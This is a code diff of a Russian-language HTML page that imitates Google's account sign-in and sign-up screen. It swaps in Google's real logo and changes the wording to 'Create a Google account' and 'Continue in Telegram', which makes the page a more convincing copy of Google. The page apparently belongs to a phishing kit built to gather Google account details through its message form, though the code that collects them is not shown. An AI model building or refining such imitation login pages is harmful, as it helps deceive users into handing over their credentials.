@@ -12,7 +12,7 @@
         }
         
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: 'Google Sans', 'Arial', sans-serif;
             background: white;
             display: flex;
             justify-content: center;
@@ -34,7 +34,7 @@
             margin-bottom: 16px;
         }
         
-        .google-logo svg {
+        .google-logo img {
             width: 75px;
             height: 24px;
         }
@@ -207,17 +207,12 @@
 <body>
     <div class="container">
         <div class="google-logo">
-            <!-- Google Logo SVG -->
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
-                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.894-4.72-6.253-7.785-11.956-7.785-7.223 0-12.722 5.5-12.722 12.721 0 7.22 5.5 12.722 12.722 12.722 5.703 0 9.827-2.834 11.634-7.27l-6.489-2.53c-.608 1.196-1.556 1.804-2.886 1.804z"/>
-                <path fill="#34a853" d="M36.955 2.24c4.72 0 8.427 1.582 11.634 4.785l5.703-5.702C50.365-1.17 44.168-.5 36.955.5c-6.253 0-11.634 2.278-15.58 6.253L15.58 12.5h10.834v7.422H15.58v8.427h10.834v7.422H15.58v8.427h10.834V48.5h10.834V31.349h10.834v-7.422H37.248v-7.422h10.834v-7.422H37.248V2.24z"/>
-                <path fill="#fbbc05" d="M9.027 16.303c0-2.278.68-4.287 1.804-5.973L5.5 4.628C2.02 8.574 0 13.415 0 18.795c0 5.38 2.02 10.221 5.5 14.167l5.331-5.702c-1.125-1.686-1.804-3.695-1.804-5.973z"/>
-                <path fill="#4285f4" d="M36.955 35.349c4.287 0 7.967-1.556 10.221-4.287l5.331 5.702c-3.15 3.695-8.427 5.973-15.552 5.973-6.253 0-11.634-2.278-15.58-6.253l5.331-5.702c2.254 2.73 5.934 4.287 10.22 4.287z"/>
-            </svg>
+            <!-- Правильный логотип Google -->
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google" onerror="this.style.display='none'">
         </div>
         
-        <h1 class="title">Войдите в акаунт Google</h1>
-        <p class="subtitle"></p>
+        <h1 class="title">Создайте аккаунт Google</h1>
+        <p class="subtitle">Продолжите в Telegram</p>
 
         <form id="messageForm">
             <div class="form-group">
@@ -233,7 +228,7 @@
             </div>
 
             <div class="forgot-email">
-                <a href="#">Зарегестрироваться вместо этого</a>
+                <a href="#">Войти вместо этого</a>
             </div>
 
             <div class="buttons">
@@ -313,6 +308,14 @@
 
             statusDiv.style.display = 'block';
             submitBtn.disabled = false;
+        });
+
+        // Если логотип не загрузится, покажем текстовый вариант
+        document.querySelector('.google-logo img').addEventListener('error', function() {
+            this.style.display = 'none';
+            const textLogo = document.createElement('div');
+            textLogo.innerHTML = '<span style="color: #4285f4; font-size: 24px; font-weight: bold;">G</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">o</span><span style="color: #fbbc05; font-size: 24px; font-weight: bold;">o</span><span style="color: #4285f4; font-size: 24px; font-weight: bold;">g</span><span style="color: #34a853; font-size: 24px; font-weight: bold;">l</span><span style="color: #ea4335; font-size: 24px; font-weight: bold;">e</span>';
+            document.querySelector('.google-logo').appendChild(textLogo);
         });
     </script>
 </body>
